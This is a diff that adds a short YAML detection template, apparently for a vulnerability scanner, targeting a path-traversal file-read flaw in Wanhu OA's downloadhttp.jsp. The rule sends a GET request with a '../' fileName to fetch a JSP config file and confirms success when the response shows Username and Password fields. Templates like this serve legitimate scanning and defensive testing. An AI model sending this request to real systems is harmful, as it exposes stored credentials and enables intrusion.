@@ -1,0 +1,8 @@
+name: wanhu-oa-downloadhttp-file-read
+rules: 
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+    expression: response.status == 200 && response.body.bcontains(b'<%') && response.body.bcontains(b'//Username') && response.body.bcontains(b'//Password')
+expression: r0()
